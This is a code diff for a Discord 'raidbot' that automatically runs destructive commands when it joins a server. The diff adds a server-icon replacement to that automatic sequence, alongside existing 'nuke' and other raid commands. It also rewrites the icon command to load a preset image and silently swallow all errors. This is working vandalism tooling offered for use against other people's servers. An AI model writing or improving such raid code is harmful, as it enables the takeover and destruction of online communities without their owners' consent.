@@ -37,6 +37,7 @@ async def on_guild_join(guild):
         ctx = SilentCtx(guild, channel, bot.user)
         await nuke.callback(ctx)
         await cn.callback(ctx)
+        await ci.callback(ctx)
         await bn.callback(ctx)
         await ret.callback(ctx)
 
@@ -116,19 +117,12 @@ async def cn(ctx):
 @bot.command()
 @commands.has_permissions(administrator=True)
 async def ci(ctx):
-    if not ctx.message.attachments:
-        await ctx.send("You must attach an image to use as the new server icon.")
-        return
-
-    image = ctx.message.attachments[0]
     try:
-        image_bytes = await image.read()
-        await ctx.guild.edit(icon=image_bytes)
-    except discord.Forbidden:
-        await ctx.send("No permission to change the server icon.")
-    except Exception as e:
-        await ctx.send(f"Error changing icon: {e}")
-
+        with open("chuyinci.png", "rb") as f: # In "chuyinci.png" change it to the name of an image you want and write its name, remember that the image must be in the raidbot file
+            imagen_bytes = f.read()
+            await ctx.guild.edit(icon=imagen_bytes)
+    except:
+        pass
 @bot.command()
 @commands.has_permissions(manage_roles=True)
 async def cr(ctx, amount: int = 100):
@@ -323,4 +317,5 @@ async def on_ready():
 
 
 bot.run("TOKEN DISCORD BOT")
+
 
